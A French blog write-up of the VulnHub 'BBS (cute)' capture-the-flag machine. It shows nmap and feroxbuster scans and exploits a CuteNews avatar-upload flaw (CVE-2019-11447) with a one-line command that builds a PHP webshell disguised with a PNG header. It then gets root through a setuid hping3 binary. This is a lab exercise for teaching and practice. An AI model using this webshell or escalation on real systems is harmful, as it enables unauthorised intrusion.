# Solution du CTF Cute de VulnHub

Ayant résolu déjà 2 CTFs de foxlox (ICMP et Boverflow) et les trouvant plutôt intéressants j'ai décidé de continuer avec celui-ci. Je ne sais pas exactement quel est son nom il est désigné comme [BBS (cute): 1.0.2](https://www.vulnhub.com/entry/bbs-cute-102,567/) sur VulnHub.

```
Nmap scan report for 192.168.56.45
Host is up (0.00026s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)
|   256 24b3df010bcac2ab2ee949b058086afa (ECDSA)
|_  256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     nginx 1.14.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: PIPELINING LOGIN-DELAY(10) IMPLEMENTATION(Courier Mail Server) UIDL TOP USER UTF8(USER) STLS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
995/tcp open  ssl/pop3 Courier pop3d
|_pop3-capabilities: LOGIN-DELAY(10) IMPLEMENTATION(Courier Mail Server) UIDL TOP USER UTF8(USER) PIPELINING
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
```

## Mignon tout plein

On a ici deux services HTTP, l'un sur le port standard, l'autre sur le port 88. Il y a aussi un serveur de messagerie.

Les deux sites ne retournant rien d'intéressant, je commence par chercher sur le port 80 des fichiers/dossiers intéressants :

```shellsession
$ feroxbuster -u http://192.168.56.45/ -w discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.45/
 🚀  Threads               │ 50
 📖  Wordlist              │ filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      316c http://192.168.56.45/uploads
301        9l       28w      313c http://192.168.56.45/docs
301        9l       28w      314c http://192.168.56.45/skins
301        9l       28w      313c http://192.168.56.45/libs
301        9l       28w      313c http://192.168.56.45/core
301        9l       28w      321c http://192.168.56.45/skins/images
301        9l       28w      316c http://192.168.56.45/libs/js
301        9l       28w      317c http://192.168.56.45/libs/css
301        9l       28w      322c http://192.168.56.45/core/includes
301        9l       28w      321c http://192.168.56.45/core/modules
301        9l       28w      319c http://192.168.56.45/core/tools
301        9l       28w      318c http://192.168.56.45/core/lang
301        9l       28w      319c http://192.168.56.45/libs/fonts
301        9l       28w      321c http://192.168.56.45/core/captcha
301        9l       28w      315c http://192.168.56.45/manual
301        9l       28w      322c http://192.168.56.45/manual/images
301        9l       28w      318c http://192.168.56.45/manual/en
301        9l       28w      318c http://192.168.56.45/manual/de
301        9l       28w      318c http://192.168.56.45/manual/fr
301        9l       28w      321c http://192.168.56.45/manual/style
301        9l       28w      318c http://192.168.56.45/manual/es
301        9l       28w      323c http://192.168.56.45/manual/en/misc
301        9l       28w      323c http://192.168.56.45/manual/fr/misc
301        9l       28w      319c http://192.168.56.45/skins/base
200      128l      671w     9844c http://192.168.56.45/manual/fr/
301        9l       28w      322c http://192.168.56.45/manual/fr/faq
301        9l       28w      322c http://192.168.56.45/manual/fr/ssl
301        9l       28w      322c http://192.168.56.45/manual/fr/mod
301        9l       28w      327c http://192.168.56.45/manual/fr/programs
200      128l      611w     9544c http://192.168.56.45/manual/de/
301        9l       28w      327c http://192.168.56.45/manual/fr/platform
301        9l       28w      327c http://192.168.56.45/manual/de/platform
301        9l       28w      326c http://192.168.56.45/manual/de/rewrite
301        9l       28w      319c http://192.168.56.45/migrations
200       99l      452w     5717c http://192.168.56.45/manual/fr/misc/
```

Ca fait pas mal de dossiers mais ça ne me parle pas vraiment, mis à part le dossier *migrations* qui mentionne une appli web  nommée *CuteNews*.

Le listing des fichiers est plus instructif :

```shellsession
$ feroxbuster -u http://192.168.56.45/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.45/
 🚀  Threads               │ 50
 📖  Wordlist              │ ble-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      368l      933w    10701c http://192.168.56.45/index.html
200       63l      481w     3119c http://192.168.56.45/LICENSE.txt
200        1l       12w     1150c http://192.168.56.45/favicon.ico
403        9l       28w      278c http://192.168.56.45/.htaccess
200      368l      933w    10701c http://192.168.56.45/
403        9l       28w      278c http://192.168.56.45/.html
403        9l       28w      278c http://192.168.56.45/.php
403        9l       28w      278c http://192.168.56.45/.htpasswd
403        9l       28w      278c http://192.168.56.45/.htm
403        9l       28w      278c http://192.168.56.45/.htpasswds
200        1l        7w       91c http://192.168.56.45/captcha.php
200        1l        6w       28c http://192.168.56.45/print.php
200      168l      396w     6175c http://192.168.56.45/index.php
200        5l      204w     5118c http://192.168.56.45/search.php
200        1l        6w       28c http://192.168.56.45/popup.php
200        2l       16w      105c http://192.168.56.45/rss.php
200      155l      752w        0c http://192.168.56.45/example.php
403        9l       28w      278c http://192.168.56.45/.htgroup
403        9l       28w      278c http://192.168.56.45/wp-forum.phps
403        9l       28w      278c http://192.168.56.45/.htaccess.bak
403        9l       28w      278c http://192.168.56.45/.htuser
403        9l       28w      278c http://192.168.56.45/.ht
403        9l       28w      278c http://192.168.56.45/.htc
200        2l      380w     2987c http://192.168.56.45/show_news.php
403        9l       28w      278c http://192.168.56.45/.htaccess.old
403        9l       28w      278c http://192.168.56.45/.htacess
```

On peut voir ici que *index.php* est différent de *index.html*. Pour un Apache par défaut le html est utilisé avant le php. Si on demande exploicitement *index.php* on se retrouve finalement devant une installation de *CuteNews*.

Cette appli web est vulnérable à une vulnérabilité de type unrestricted upload (menant à un RCE) : [GitHub - ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE: Exploit Code for CVE-2019-11447 aka CuteNews 2.1.2 Avatar upload RCE (Authenticated)](https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE)

Pour cela il faut préalablement créer un compte sur l'appli via le lien *Register*. Dans l'ensemble aucun problème pour cette opération mais à part qu'un captcha est demandé alors qu'aucune image n'apparait dans la page.

En analysant un peu la situation on voit que l'URL de l'image qui est *captcha.php* retourne en fait du texte. Il suffit de récupérer l'output du script et de recopier dans le champ captcha pour passer l'enregistrement.

L'exploitation consiste à uploader comme avatar du compte un fichier avec extension PHP qui passera la vérification du type mime.

On peut ainsi créer un script PHP qui aura un entête d'image PNG puis l'uploader :

```shellsession
$ echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.php
```

De cette façon j'obtiens mon shell à l'adresse suivante :

http://192.168.56.45/uploads/avatar_devloop_shell.php?cmd=id

L'étape suivante consiste à upgrader ce webshell vers un [reverse-ssh: Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh).

## Aller simple vers root, sans correspondance

Pour les autres CTFs de la série on trouve un utilisateur *fox* qui dispose du premier flag.

```shellsession
www-data@cute:/home/fox$ cat user.txt 
dcb8189a0eaf7a690a67785a7299be60
```

Mais je ne trouve rien d'intéressant permettant de passer de l'utilisateur courant (*www-data*) vers *fox*.

Il y a bien cette entrée sudo permettant d'exécuter *hping3* en tant que root mais avec l'absence d'astérisque son utilisation n'a pas de sens :

```shellsession
www-data@cute:/home/fox$ sudo -l
Matching Defaults entries for www-data on cute:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3 --icmp
```

Si on tente par exemple de rajouter le paramètre *--file* comme sur le [CTF ICMP](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20ICMP%20de%20VulnHub.md) on sort de la permission *sudo* et ce dernier demande alors le mot de passe de *www-data* que l'on ne connait pas.

Le binaire est toutefois aussi setuid root mais si on passe *--file* on a un message indiquant que l'option est désactivée quand le bit setuid est actif... sniff.

```shellsession
www-data@cute:/tmp$ /usr/sbin/hping3 --icmp --file /etc/shadow -d 100 192.168.56.1
Option disabled when setuid `--file'
```

Finalement après pas mal de recherches infructueuses je suis allé sur [l'entrée hping3 pour gtfobins](https://gtfobins.github.io/gtfobins/hping3/) et découvert qu'on pouvait utiliser le binaire comme une sorte d'interpréteur :

```shellsession
www-data@cute:/$ hping3
hping3> /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
0b18032c2d06d9e738ede9bc24795ff2
```

A défaut d'avoir un CTF plus long via l'utilisateur *fox* j'aurais découvert une particularité de hping3 :)

*Publié le 5 novembre 2022*
